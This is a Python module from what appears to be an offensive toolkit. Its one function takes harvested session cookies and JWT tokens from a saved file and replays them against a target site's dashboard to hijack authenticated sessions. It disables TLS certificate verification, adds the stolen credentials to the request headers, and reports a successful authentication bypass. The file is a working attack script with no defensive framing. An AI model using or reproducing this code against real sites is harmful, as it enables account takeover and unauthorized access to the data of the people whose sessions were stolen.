import json
import os
import urllib.request
import ssl

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

def replay_hijacked_session(target_domain, session_file_path=None):
    """
    Takes harvested session cookies and JWT tokens from reports/sessions/ 
    and replays them against the target in real time using pure Python.
    """
    print(f"\n\033[95m[***] DEPLOYING PURE-PYTHON SESSION REPLAYER [***]\033[0m")
    
    if not session_file_path:
        session_file_path = f"reports/sessions/session_{target_domain.replace('.', '_')}.json"
        
    if not os.path.exists(session_file_path):
        print(f" \033[91m[!] Error: Session file not found at {session_file_path}\033[0m")
        return False

    try:
        with open(session_file_path, "r") as f:
            session_data = json.load(f)
            
        cookies = session_data.get("set_cookies", [])
        jwts = session_data.get("jwts", [])
        
        print(f" \033[93m[*] Loaded session state for: {session_data.get('target')}\033[0m")
        print(f"     ├── Cookies loaded : {len(cookies)}")
        print(f"     └── JWTs loaded    : {len(jwts)}\n")

        # Construct replayer request headers
        url = f"https://{target_domain}/dashboard"  # Common authenticated endpoint
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        # Inject stolen cookies if available
        if cookies:
            cookie_str = "; ".join([c.split(';')[0] for c in cookies])
            headers["Cookie"] = cookie_str
            
        # Inject JWT Bearer token if available
        if jwts:
            headers["Authorization"] = f"Bearer {jwts[0]}"

        print(f" \033[36m[*] Replaying hijacked session state to {url}...\033[0m")
        
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
            body = resp.read().decode(errors="ignore")
            print(f" \033[92m[+] SESSION REPLAY SUCCESS -> Status: {resp.status} | Response Size: {len(body)} bytes\033[0m")
            
            if "dashboard" in body.lower() or resp.status == 200:
                print(f" \033[92m[+++] CLONED SESSION ACTIVE! Operator has successfully bypassed authentication.\033[0m")
            return True

    except Exception as e:
        print(f" \033[91m[-] Session replay failed: {e}\033[0m")
        return False
